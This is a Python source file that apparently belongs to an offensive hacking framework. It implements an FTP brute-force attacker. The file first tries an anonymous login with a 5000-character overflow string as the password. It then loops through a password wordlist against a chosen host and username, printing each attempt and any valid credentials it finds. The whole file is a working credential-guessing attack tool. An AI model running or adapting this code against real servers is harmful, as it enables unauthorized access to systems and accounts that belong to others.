#!/usr/bin/python
import src.source.use
import bin.interfaces.exploit.exploit_ftp
import src.Logging.print_stdout

def config_process(hostname, username, password):
    try:
        ftp = src.source.use.ftplib.FTP(hostname)
        ftp.login(username, password)
        ftp.quit()
        return True
    except IOError:
        return False
    except KeyboardInterrupt:
        src.Logging.print_stdout.print_error(
            "Stop process. User Interrupt!!"
        )
        bin.interfaces.exploit.exploit_ftp.Main_Interactive_FTP()

class FTP_Brute_Force(object):
    def __init__(self, hostname, username, password):
        self.hostname_target = hostname
        self.username_target = username
        self.password_file = password
        self.convert_to_ip = src.source.use.socket.gethostbyname(self.hostname_target)

    def mainBruteForce(self):
        self.password_overflow = '\x41' * 5000
        if config_process(self.hostname_target, "anonymous", self.password_overflow):
            src.Logging.print_stdout.print_process(
                "Anonymous Login Successfully!!"
            )
            bin.interfaces.exploit.exploit_ftp.Main_Interactive_FTP()
        else:
            src.Logging.print_stdout.print_process(
                "Starting FTP Brute Force on {host} at {time}".format(
                    host=self.hostname_target,
                    time=src.source.use.time.strftime("%H:%M:%S-%p")
                )
            )
            try:
                self.passwordFiles = open(self.password_file, 'r')
                for passwords in self.passwordFiles.readlines():
                    self.passwords = passwords.strip("\r").strip("\n")
                    if config_process(self.hostname_target, self.username_target, self.passwords):
                        src.Logging.print_stdout.print_process(
                            "Successfully valid username: {user} password: {password}".format(
                                user=self.username_target,
                                password=self.passwords
                            )
                        )
                        bin.interfaces.exploit.exploit_ftp.Main_Interactive_FTP()
                    else:
                        src.Logging.print_stdout.print_process(
                            "Attempt {host} ({convert}) with username: {user} password: {passwd}".format(
                                host=self.hostname_target,
                                convert=self.convert_to_ip,
                                user=self.username_target,
                                passwd=self.passwords
                            )
                        )
            except KeyboardInterrupt:
                src.Logging.print_stdout.print_error(
                    "Stop process. User Interrupt!!"
                )
                src.source.use.time.sleep(1)
                bin.interfaces.exploit.exploit_ftp.Main_Interactive_FTP()
